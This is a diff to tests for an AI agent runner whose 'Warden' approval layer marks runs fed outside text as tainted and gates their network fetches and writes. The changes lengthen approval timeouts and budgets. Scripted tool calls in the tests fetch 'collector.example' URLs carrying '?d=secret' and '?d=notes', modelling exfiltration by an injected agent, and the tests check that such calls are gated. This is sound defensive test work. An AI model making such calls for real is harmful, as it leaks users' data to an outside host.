@@ -308,7 +308,7 @@ test("a run a watcher hit started is tainted from its first call", async () => {
       NOW - 1000,
     );
     // Nobody answers: the ask expires quickly and the run goes on.
-    const { inbox, asked } = wardenInbox("ignore", 30);
+    const { inbox, asked } = wardenInbox("ignore", 250);
     const fetched: unknown[] = [];
     const { provider, calls } = scripted([
       turn([call("web_fetch", { url: "https://collector.example/x?d=secret" })]),
@@ -347,7 +347,7 @@ test("a run a watcher hit started is tainted from its first call", async () => {
 test("the same first call in a routine nobody fed outside text is not tainted", async () => {
   await withHome(async (home, ws) => {
     await dueRoutine();
-    const { inbox, asked } = wardenInbox("ignore", 30);
+    const { inbox, asked } = wardenInbox("ignore", 250);
     const fetched: unknown[] = [];
     const runner = makeRunner(ws, {
       provider: scripted([
@@ -402,7 +402,7 @@ test("a run that became tainted is still tainted when it is resumed after a rest
     assert.equal((await loadRun(task.id, runId))!.run.tainted, true, "recorded on the run");
 
     // Process 2: the resumed segment starts tainted — a fetch to a new address asks.
-    const two = wardenInbox("ignore", 30);
+    const two = wardenInbox("ignore", 250);
     const b = makeRunner(ws, {
       provider: scripted([
         turn([call("web_fetch", { url: "https://collector.example/?d=notes" })]),
@@ -519,7 +519,7 @@ test("denied, the write never runs; the model is told and the run finishes", asy
 test("unanswered, the approval expires as a deny: the write never runs and the run ends normally", async () => {
   await withHome(async (home, ws) => {
     const task = await dueRoutine();
-    const { inbox, asked } = wardenInbox("ignore", 40);
+    const { inbox, asked } = wardenInbox("ignore", 250);
     const writes: unknown[] = [];
     const { provider, calls } = writeScript(ws);
     const runner = makeRunner(ws, {
@@ -1039,10 +1039,13 @@ test("asks per run are capped: past the ceiling the run stops (approval_limit) w
   await withHome(async (_home, ws) => {
     const task = await dueRoutine({
       nextRunAt: Date.now() - 1000,
-      budget: { tokens: 1_000_000, wallclockMs: 150, maxToolCalls: 12 },
+      // The wall clock is paused while an ask waits, so 900 ms of active time
+      // is below the 6 × 200 ms spent waiting (counting the waits would trip
+      // it) yet leaves room for a slow, coverage-instrumented runner.
+      budget: { tokens: 1_000_000, wallclockMs: 900, maxToolCalls: 12 },
     });
-    // Nobody answers: every ask expires after 80 ms.
-    const { inbox, asked } = wardenInbox("ignore", 80);
+    // Nobody answers: every ask expires after 200 ms.
+    const { inbox, asked } = wardenInbox("ignore", 200);
     const gate = gateRecorder();
     const { notices, deliver } = collector();
     const writes: unknown[] = [];
@@ -1071,7 +1074,7 @@ test("asks per run are capped: past the ceiling the run stops (approval_limit) w
       ["task_failed"],
       "one notice for the stop",
     );
-    assert.ok(took < 6 * 80 + 400, `stopped at the ceiling (${took} ms), not after 10 asks`);
+    assert.ok(took < 6 * 200 + 600, `stopped at the ceiling (${took} ms), not after 10 asks`);
     await inbox.shutdown();
   });
 });
@@ -1318,7 +1321,7 @@ test("the Warden session's uid comes from the tenant scope; a task file naming a
         nextRunAt: Date.now() - 1000,
       });
       const seen: Array<{ taskId: string; uid: string | null }> = [];
-      const { inbox } = wardenInbox("ignore", 30);
+      const { inbox } = wardenInbox("ignore", 250);
       const real = factoryOn(inbox);
       const factory: TaskApprovalFactory = Object.assign(
         async (ctx: Parameters<TaskApprovalFactory>[0]) => {
